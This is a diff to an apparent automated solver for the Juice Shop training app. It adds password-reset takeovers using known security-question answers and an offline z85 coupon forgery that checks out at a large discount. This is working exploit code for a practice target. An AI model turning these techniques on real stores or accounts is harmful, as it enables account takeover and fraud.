@@ -97,7 +97,9 @@ def _resets(c):
                           ("bender@juice-sh.op", "Stop'n'Drop"),           # Reset Bender
                           ("bjoern@juice-sh.op", "West-2082"),             # Reset Bjoern
                           ("morty@juice-sh.op", "5N0wb41L"),               # Reset Morty (known answer)
-                          ("uvogin@juice-sh.op", "Silence of the Lambs")): # Reset Uvogin
+                          ("uvogin@juice-sh.op", "Silence of the Lambs"),  # Reset Uvogin
+                          ("john@juice-sh.op", "Daniel Boone National Forest"),  # Meta Geo Stalking
+                          ("emma@juice-sh.op", "ITsec")):                  # Visual Geo Stalking
         c.post("/rest/user/reset-password", json={"email": email, "answer": answer, "new": _PW, "repeat": _PW})
 
 
@@ -233,6 +235,50 @@ def _checkout_orders(c):
     _order(1, -300)           # Payback Time
 
 
+_Z85 = "0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ.-:+=^!/*?&<>()[]{}@%$#"
+
+
+def _z85(data: bytes) -> str:
+    while len(data) % 4:
+        data += b"\x00"
+    out = []
+    for i in range(0, len(data), 4):
+        v = (data[i] << 24) | (data[i + 1] << 16) | (data[i + 2] << 8) | data[i + 3]
+        ch = []
+        for _ in range(5):
+            ch.append(_Z85[v % 85]); v //= 85
+        out.extend(reversed(ch))
+    return "".join(out)
+
+
+def _forged_coupon(c):
+    """Forge a >=80% coupon offline (z85 of 'MMMYY-99' for the current campaign month), apply it
+    and check out — the order's discount>=80 solves it."""
+    from datetime import datetime
+    mmm = datetime.now().strftime("%b").upper() + datetime.now().strftime("%y")
+    coupon = _z85((mmm + "-99").encode())
+    email = "fc_%s@x.io" % id(c)
+    _register(c, email, _PW)
+    a = _login(c, email, _PW)
+    tok, bid = a.get("token"), a.get("bid")
+    if not tok or not bid:
+        return
+    H = {"Authorization": "Bearer " + tok}
+    try:
+        c.post("/api/BasketItems", headers=H, json={"ProductId": 1, "BasketId": bid, "quantity": 1})
+        c.put("/rest/basket/%s/coupon/%s" % (bid, coupon), headers=H)
+        aid = c.post("/api/Addresss", headers=H, json={"fullName": "T", "mobileNum": "1234567890",
+                     "zipCode": "12345", "streetAddress": "1 St", "city": "X", "state": "Y",
+                     "country": "Z"}).json()["data"]["id"]
+        cid = c.post("/api/Cards", headers=H, json={"fullName": "T", "cardNum": "4111111111111111",
+                     "expMonth": 12, "expYear": 2099}).json()["data"]["id"]
+        did = (c.get("/api/Deliverys", headers=H).json().get("data") or [{"id": 1}])[0]["id"]
+        c.post("/rest/basket/%s/checkout" % bid, headers=H, json={"couponData": coupon,
+               "orderDetails": {"paymentId": cid, "addressId": aid, "deliveryMethodId": did}})
+    except Exception:
+        pass
+
+
 def _socket_xss(c):
     """DOM XSS + Bonus Payload + Cross-Site Imaging via the frontend's Socket.IO verify events
     (engine.io v4 polling handshake -> emit). Server solves on contains/regex — no browser."""
@@ -277,7 +323,8 @@ def solve(base_url: str) -> dict:
         AH = {"Authorization": "Bearer %s" % admin.get("token")} if admin.get("token") else {}
         for step in (_sqli_logins, _known_cred_logins, _known_login_challenges, _registrations,
                      _resets, _beacon_visits, _uploads, _basket_manipulate, _deluxe_fraud,
-                     _socket_xss, _ephemeral_accountant, _retrieve_blueprint, _checkout_orders):
+                     _socket_xss, _ephemeral_accountant, _retrieve_blueprint, _checkout_orders,
+                     _forged_coupon):
             try:
                 step(c)
             except Exception:
